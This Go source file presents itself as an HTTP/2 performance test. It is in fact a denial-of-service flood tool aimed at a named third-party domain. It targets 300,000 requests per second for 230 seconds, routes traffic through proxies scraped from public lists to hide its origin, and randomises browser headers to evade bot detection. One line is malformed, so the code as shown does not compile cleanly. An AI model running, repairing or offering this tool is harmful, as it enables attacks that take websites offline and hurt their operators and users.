package main

import (
    "crypto/tls"
    "fmt"
    "math/rand"
    "net"
    "runtime"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "github.com/valyala/fasthttp"
)

var (
    acceptList = []string{
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/javascript, */*;q=0.8",
        "application/x-www-form-urlencoded;q=0.9,image/webp,image/apng,*/*;q=0.8",
    }
    userAgentList = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3945.88 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.102 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.66 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3945.79 Mobile Safari/537.36",
    }
    paths = []string{"/", "/home", "/login", "/dashboard", "/api/data", "/status"}
)

func getRandomInt(min, max int) int {
    return rand.Intn(max-min+1) + min
}

func randomMethod() string {
    if rand.Float64() < 0.5 {
        return "GET"
    }
    return "POST"
}

func randomPath() string {
    return paths[rand.Intn(len(paths))]
}

func main() {
    // Configuration
    const targetRPS = 300000
    const testDuration = 230 * time.Second
    const url = "https://subxin.com"

    // Optimize runtime
    runtime.GOMAXPROCS(runtime.NumCPU())
    rand.Seed(time.Now().UnixNano())

    // Statistics
    var totalRequests int64
    var successfulRequests int64
    var failedRequests int64
    var peakRPS int64

    // Fetch and validate proxies
    proxies := fetchProxies()
    if len(proxies) == 0 {
        fmt.Println("No proxies found, using direct connection.")
        proxies = append(proxies, "") // Direct connection fallback
    }
    fmt.Printf("Loaded %d proxies\n", len(proxies))

    // Custom TLS configuration
    tlsConfig := &tls.Config{
        Ciphers: []uint16{
            tls.TLS_AES_128_GCM_SHA256,
            tls.TLS_AES_256_GCM_SHA384,
        },
        MinVersion:         tls.VersionTLS13,
        MaxVersion:         tls.VersionTLS13,
        CurvePreferences:   []tls.CurveID{tls.X25519},
        InsecureSkipVerify: true, // For testing; set to false in production
        NextProtos:         []string{"h2"},
    }

    // Create fasthttp client with HTTP/2 and proxy support
    client := &fasthttp.Client{
        MaxConnsPerHost:     20000,
        ReadTimeout:         500 * time.Millisecond,
        WriteTimeout:        500 * time.Millisecond,
        MaxIdleConnDuration: 0,
        TLSConfig:           tlsConfig,
        Dial: func(addr string) (net.Conn, error) {
            proxyIdx := int(atomic.AddInt64(&totalRequests, 1)) % len(proxies)
            if proxies[proxyIdx] == "" {
                conn, err := fasthttp.Dial(addr)
                if err != nil {
                    fmt.Printf("Direct dial failed: %v\n", err)
                }
                return conn, err
            }
            conn, err := fasthttp.DialDualStack(proxies[proxyIdx])
            if err != nil {
                fmt.Printf("Proxy dial failed (%s): %v\n", proxies[proxyIdx], err)
            }
            return conn, err
        },
    }

    // WaitGroup and done channel
    var wg sync.WaitGroup
    done := make(chan struct{})

    // RPS tracking
    rpsTicker := time.NewTicker(1 * time.Second)
    defer rpsTicker.Stop()
    var requestsThisSecond int64

    // Start request sender
    startTime := time.Now()
    worker    workerCount := runtime.NumCPU() * 1000
    for i := 0; i < workerCount; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            req := fasthttp.AcquireRequest()
            resp := fasthttp.AcquireResponse()
            defer fasthttp.ReleaseRequest(req)
            defer fasthttp.ReleaseResponse(resp)

            for {
                select {
                case <-done:
                    return
                default:
                    // Randomize request
                    req.SetRequestURI(url + randomPath())
                    req.Header.SetMethod(randomMethod())
                    req.Header.Set(":authority", "subxin.com")
                    req.Header.Set(":scheme", "https")
                    req.Header.Set("sec-purpose", "prefetch;prerender")
                    req.Header.Set("purpose", "prefetch")
                    req.Header.Set("sec-ch-ua", fmt.Sprintf(`"Not_A Brand";v="%d", "Chromium";v="%d", "Google Chrome";v="%d"`,
                        getRandomInt(121, 345), getRandomInt(421, 6345), getRandomInt(421, 7124356)))
                    req.Header.Set("sec-ch-ua-mobile", "?0")
                    req.Header.Set("sec-ch-ua-platform", func() string {
                        if rand.Float64() < 0.5 {
                            return "Windows"
                        }
                        return "MacOS"
                    }())
                    req.Header.Set("upgrade-insecure-requests", "1")
                    req.Header.Set("accept", acceptList[rand.Intn(len(acceptList))])
                    req.Header.Set("accept-encoding", "gzip, deflate, br")
                    req.Header.Set("accept-language", "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7")
                    req.Header.Set("referer", "https://subxin.com"+randomPath())
                    req.Header.Set("user-agent", userAgentList[rand.Intn(len(userAgentList))])

                    atomic.AddInt64(&requestsThisSecond, 1)
                    err := client.Do(req, resp)
                    if err != nil {
                        atomic.AddInt64(&failedRequests, 1)
                        continue
                    }
                    // Only count 200 as successful
                    if resp.StatusCode() == 200 {
                        atomic.AddInt64(&successfulRequests, 1)
                    } else {
                        atomic.AddInt64(&failedRequests, 1)
                        fmt.Printf("Non-200 status: %d\n", resp.StatusCode())
                    }
                }
            }
        }()
    }

    // Track peak RPS
    go func() {
        for {
            select {
            case <-done:
                return
            case <-rpsTicker.C:
                currentRPS := atomic.SwapInt64(&requestsThisSecond, 0)
                if currentRPS > peakRPS {
                    atomic.StoreInt64(&peakRPS, currentRPS)
                }
            }
        }
    }()

    // Run for 230 seconds
    time.Sleep(testDuration)
    close(done)
    wg.Wait()

    // Calculate results
    elapsed := time.Since(startTime)
    averageRPS := float64(totalRequests) / elapsed.Seconds()

    // Print results
    fmt.Printf("\nHTTP/2 Performance Test Results (230s duration):\n")
    fmt.Printf("Target URL: %s\n", url)
    fmt.Printf("Total Requests: %d\n", totalRequests)
    fmt.Printf("Successful Requests (200 only): %d\n", successfulRequests)
    fmt.Printf("Failed Requests: %d\n", failedRequests)
    fmt.Printf("Peak RPS: %d\n", peakRPS)
    fmt.Printf("Average RPS: %.2f\n", averageRPS)
    fmt.Printf("Success Rate: %.2f%%\n", float64(successfulRequests)/float64(totalRequests)*100)
}

// fetchProxies downloads proxy lists from multiple sources
func fetchProxies() []string {
    proxySources := []string{
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    }
    var proxies []string

    client := &fasthttp.Client{ReadTimeout: 5 * time.Second}
    req := fasthttp.AcquireRequest()
    resp := fasthttp.AcquireResponse()
    defer fasthttp.ReleaseRequest(req)
    defer fasthttp.ReleaseResponse(resp)

    for _, source := range proxySources {
        req.SetRequestURI(source)
        if err := client.Do(req, resp); err != nil {
            fmt.Printf("Failed to fetch proxies from %s: %v\n", source, err)
            continue
        }
        body := resp.Body()
        lines := strings.Split(string(body), "\n")
        for _, line := range lines {
            line = strings.TrimSpace(line)
            if line != "" && !strings.Contains(line, "#") {
                proxies = append(proxies, line)
            }
        }
    }
    return proxies
}
